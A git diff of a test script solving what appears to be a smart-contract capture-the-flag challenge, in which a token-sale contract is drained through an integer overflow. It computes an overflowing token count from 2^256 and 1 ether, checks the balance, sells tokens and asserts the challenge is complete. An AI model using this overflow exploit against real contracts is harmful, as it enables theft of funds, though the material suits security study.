@@ -27,7 +27,6 @@ it("solves the challenge", async () => {
   // since dividend = quotient * divisor + remainder
   // => we can calculate the right side of the formula and pass in as a argument to buy tokens
 
-  
   const _2_POW_256 = BigNumber.from(`2`).pow(`256`)
   const ONE_ETHER = BigNumber.from(`10`).pow(`18`)
   const quotient = _2_POW_256.div(ONE_ETHER)
@@ -40,25 +39,26 @@ it("solves the challenge", async () => {
   console.log("quotient part : " + quotient)
   console.log("remainder part : " + remainder)
   console.log("1 ether - reminder : " + ONE_ETHER.sub(remainder))
-  console.log("overflowed         : " + overflowAmount)
+  console.log("overflow amount         : " + overflowAmount)
 
   const tokensToBuy = quotient.add(1)
   
+  // const buyTx = await challengeContract.buy(tokensToBuy, {
+  //   value: ONE_ETHER.sub(remainder),
+  // });
 
-  const buyTx = await challengeContract.buy(tokensToBuy, {
-    value: ONE_ETHER.sub(remainder),
-  });
-
-  console.log(`hash`, buyTx.hash)
-  await buyTx.wait();
+  // console.log(`hash`, buyTx.hash)
+  // await buyTx.wait();
   
-  // const balance: BigNumber = await challengeContract.balanceOf(await eoa.getAddress());
-  // console.log(`balance`, balance.toString());
+  const balance: BigNumber = await challengeContract.balanceOf(await eoa.getAddress());
+  console.log(`balance`, balance.toString());
 
-  // const sellTx = await challengeContract.sell(`1`);
-  // await sellTx.wait();
+  // There was many issued tx's which took hours to be mined
+  // So the contract total balance was > 2 Ethers
+  const sellTx = await challengeContract.sell(`2`);
+  await sellTx.wait();
 
-  // const isComplete = await challengeContract.isComplete();
-  // expect(isComplete).to.be.true;
+  const isComplete = await challengeContract.isComplete();
+  expect(isComplete).to.be.true;
 
 });
